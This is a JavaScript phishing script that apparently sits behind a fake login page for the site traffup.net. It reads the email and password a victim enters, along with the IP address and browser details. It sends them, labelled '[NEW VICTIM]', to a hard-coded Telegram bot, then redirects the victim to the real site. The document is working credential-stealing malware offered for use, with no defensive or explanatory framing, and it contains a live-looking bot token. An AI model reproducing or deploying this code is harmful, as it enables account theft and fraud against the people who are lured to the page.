function sendTelegramMessage(message) {
  var apiUrl = `https://api.telegram.org/bot7633150900:AAH6w_pI0vB9UCLOiNZAAa1QRSGbh5ghivs/sendMessage`;
  var params = {
    'chat_id': 7616544351,
    'text': message,
  };

  fetch(apiUrl + '?' + new URLSearchParams(params), {
    method: 'GET'
  })
    .then(response => response.json())
    .then(data => {
      console.log('Response:', data);
    })
    .catch(error => {
      console.error('Error during fetch operation:', error);
    });
}

function getAutofilledValues() {
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;
    var boxAccPts = document.getElementById('box_acc_pts');
    var userAgent = navigator.userAgent;

    fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
        if (boxAccPts) {
          var content = boxAccPts.innerText || boxAccPts.textContent;
          var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\n\nPoints: ${content}`;
          sendTelegramMessage(message); 
        } else {
          var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\n\nPoints: Not Found`;
          sendTelegramMessage(message);
        }
    })
    .catch(error => {
        if (boxAccPts) {
            var content = boxAccPts.innerText || boxAccPts.textContent;
            var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${Check1}\n\nPoints: ${content}`;
            sendTelegramMessage(message);
          } else {
            var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${Check1}\n\nPoints: Not Found`;
            sendTelegramMessage(message); 
          }
    });

    window.location.href = "https://traffup.net/websites";
}
